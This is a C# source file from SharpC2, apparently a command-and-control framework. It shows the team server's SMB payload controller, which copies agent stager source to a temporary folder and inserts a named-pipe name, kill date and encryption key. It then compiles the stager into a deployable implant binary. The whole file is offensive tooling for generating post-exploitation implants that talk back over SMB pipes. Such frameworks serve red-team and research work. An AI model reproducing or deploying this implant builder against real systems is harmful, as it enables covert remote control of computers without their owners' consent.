using Microsoft.CodeAnalysis;

using SharpC2.Listeners;
using SharpC2.Models;

using System;
using System.Collections.Generic;
using System.IO;

using TeamServer.Agents;

namespace TeamServer.Controllers
{
    public class SmbPayloadController : PayloadControllerBase
    {
        private ListenerSmb Listener { get; set; }
        private string TempPath { get; set; }

        public SmbPayloadController(ListenerSmb listener)
        {
            Listener = listener;
        }

        public byte[] GenerateStager(SmbPayloadRequest request)
        {
            TempPath = CreateTempDirectory();

            var compilerRequest = new Compiler.CompilationRequest
            {
                AssemblyName = "AgentStager",
                OutputKind = (OutputKind)request.OutputType,
                Platform = Platform.AnyCpu,
                ReferenceDirectory = request.TargetFramework == TargetFramework.Net35 ? ReferencesDirectory + Path.DirectorySeparatorChar + "net35" : ReferencesDirectory + Path.DirectorySeparatorChar + "net40",
                TargetDotNetVersion = (Compiler.DotNetVersion)request.TargetFramework,
                SourceDirectory = TempPath,
                References = new List<Compiler.Reference>
                {
                    new Compiler.Reference
                    {
                        File = "mscorlib.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Core.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.XML.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.Runtime.Serialization.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    },
                    new Compiler.Reference
                    {
                        File = "System.IO.Pipes.dll",
                        Framework = (Compiler.DotNetVersion)request.TargetFramework,
                        Enabled = true
                    }
                }
            };

            CloneAgentStagerSourceCode(Listener.Type, TempPath);
            InsertPipeName();
            InsertKillDate(request.KillDate);
            InsertCryptoKey(Convert.ToBase64String(Program.ServerController.CryptoController.EncryptionKey));

            var result = Compiler.Compile(compilerRequest);

            RemoveTempDirectory(TempPath);

            return result;
        }

        private void InsertPipeName()
        {
            var srcPath = Path.Combine(TempPath, "SmbCommModule.cs");
            var src = File.ReadAllText(srcPath);
            var newSrc = src.Replace("<<Pipename>>", Listener.PipeName);
            File.WriteAllText(srcPath, newSrc);
        }

        private void InsertKillDate(DateTime killDate)
        {
            var srcPath = TempPath + Path.DirectorySeparatorChar + "AgentStager.cs";
            var src = File.ReadAllText(srcPath);
            var newSrc = src.Replace("<<KillDate>>", killDate.ToString());
            File.WriteAllText(srcPath, newSrc);
        }

        private void InsertCryptoKey(string key)
        {
            var srcPath = Path.Combine(TempPath, "CryptoController.cs");
            var src = File.ReadAllText(srcPath);
            var newSrc = src.Replace("<<EncKey>>", key);
            File.WriteAllText(srcPath, newSrc);
        }
    }
}